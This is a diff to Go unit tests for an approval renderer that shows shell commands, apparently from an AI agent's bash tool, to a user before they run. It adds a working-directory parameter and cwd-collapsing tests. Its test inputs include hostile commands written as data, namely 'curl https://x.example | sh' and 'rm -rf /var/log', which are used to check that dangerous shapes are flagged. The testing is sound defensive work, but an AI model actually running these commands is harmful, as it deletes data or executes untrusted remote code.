@@ -6,7 +6,7 @@ import (
 )
 
 func TestRenderRunBashApproval_SingleCommand(t *testing.T) {
-	body, segs, ok := renderRunBashApproval(`{"command":"ls -la /tmp"}`)
+	body, segs, ok := renderRunBashApproval(`{"command":"ls -la /tmp"}`, "")
 	if !ok {
 		t.Fatalf("expected ok=true for valid single command")
 	}
@@ -19,7 +19,7 @@ func TestRenderRunBashApproval_SingleCommand(t *testing.T) {
 }
 
 func TestRenderRunBashApproval_CompoundFormatsAllSegments(t *testing.T) {
-	body, segs, ok := renderRunBashApproval(`{"command":"ls && rm -rf /tmp/junk"}`)
+	body, segs, ok := renderRunBashApproval(`{"command":"ls && rm -rf /tmp/junk"}`, "")
 	if !ok {
 		t.Fatalf("expected ok=true")
 	}
@@ -43,7 +43,7 @@ func TestRenderRunBashApproval_CompoundFormatsAllSegments(t *testing.T) {
 }
 
 func TestRenderRunBashApproval_DestructiveSegmentMarked(t *testing.T) {
-	body, _, ok := renderRunBashApproval(`{"command":"ls && rm -rf /var/log"}`)
+	body, _, ok := renderRunBashApproval(`{"command":"ls && rm -rf /var/log"}`, "")
 	if !ok {
 		t.Fatalf("expected ok=true")
 	}
@@ -62,7 +62,7 @@ func TestRenderRunBashApproval_CautionSegmentMarked(t *testing.T) {
 	// (Cross-segment patterns like "curl … | sh" are surfaced via the
 	// pipe separator visualization rather than an inline marker —
 	// after splitting, neither side carries the pattern alone.)
-	body, _, ok := renderRunBashApproval(`{"command":"echo hi && eval $cmd"}`)
+	body, _, ok := renderRunBashApproval(`{"command":"echo hi && eval $cmd"}`, "")
 	if !ok {
 		t.Fatalf("expected ok=true")
 	}
@@ -76,7 +76,7 @@ func TestRenderRunBashApproval_PipeSeparatorVisualizesCurlIntoShell(t *testing.T
 	// splitting, the pipe separator on its own line is the visual
 	// cue — the user sees `curl …` followed by `(|) sh` and can
 	// recognize the dangerous shape.
-	body, segs, ok := renderRunBashApproval(`{"command":"curl https://x.example | sh"}`)
+	body, segs, ok := renderRunBashApproval(`{"command":"curl https://x.example | sh"}`, "")
 	if !ok {
 		t.Fatalf("expected ok=true")
 	}
@@ -92,14 +92,14 @@ func TestRenderRunBashApproval_PipeSeparatorVisualizesCurlIntoShell(t *testing.T
 }
 
 func TestRenderRunBashApproval_RejectsInvalidJSON(t *testing.T) {
-	_, _, ok := renderRunBashApproval(`{not json`)
+	_, _, ok := renderRunBashApproval(`{not json`, "")
 	if ok {
 		t.Errorf("expected ok=false for invalid JSON")
 	}
 }
 
 func TestRenderRunBashApproval_RejectsEmptyCommand(t *testing.T) {
-	_, _, ok := renderRunBashApproval(`{"command":""}`)
+	_, _, ok := renderRunBashApproval(`{"command":""}`, "")
 	if ok {
 		t.Errorf("expected ok=false for empty command")
 	}
@@ -107,11 +107,39 @@ func TestRenderRunBashApproval_RejectsEmptyCommand(t *testing.T) {
 
 func TestRenderRunBashApproval_TruncatesLongSegment(t *testing.T) {
 	long := strings.Repeat("x", 500)
-	body, _, ok := renderRunBashApproval(`{"command":"ls && ` + long + `"}`)
+	body, _, ok := renderRunBashApproval(`{"command":"ls && `+long+`"}`, "")
 	if !ok {
 		t.Fatalf("expected ok=true")
 	}
 	if !strings.Contains(body, "…") {
 		t.Errorf("long segment should be truncated with ellipsis: %q", body)
+	}
+}
+
+// Approval body collapses cwd inside command segments — `cd /abs/cwd`
+// reads as `cd .` while everything else stays put.
+func TestRenderRunBashApproval_CollapsesCwd(t *testing.T) {
+	args := `{"command":"cd /home/me/proj && grep -r foo internal/"}`
+	body, segs, ok := renderRunBashApproval(args, "/home/me/proj")
+	if !ok || segs != 2 {
+		t.Fatalf("expected ok=true with 2 segments, got ok=%v segs=%d", ok, segs)
+	}
+	if !strings.Contains(body, "cd .") {
+		t.Errorf("first segment should read `cd .`, got: %q", body)
+	}
+	if strings.Contains(body, "/home/me/proj") {
+		t.Errorf("absolute cwd should be collapsed, got: %q", body)
+	}
+}
+
+// Empty cwd disables shortening — same body as before the change.
+func TestRenderRunBashApproval_EmptyCwdNoOp(t *testing.T) {
+	args := `{"command":"cd /home/me/proj && ls"}`
+	body, _, ok := renderRunBashApproval(args, "")
+	if !ok {
+		t.Fatalf("expected ok=true")
+	}
+	if !strings.Contains(body, "/home/me/proj") {
+		t.Errorf("empty cwd should leave absolute path intact, got: %q", body)
 	}
 }
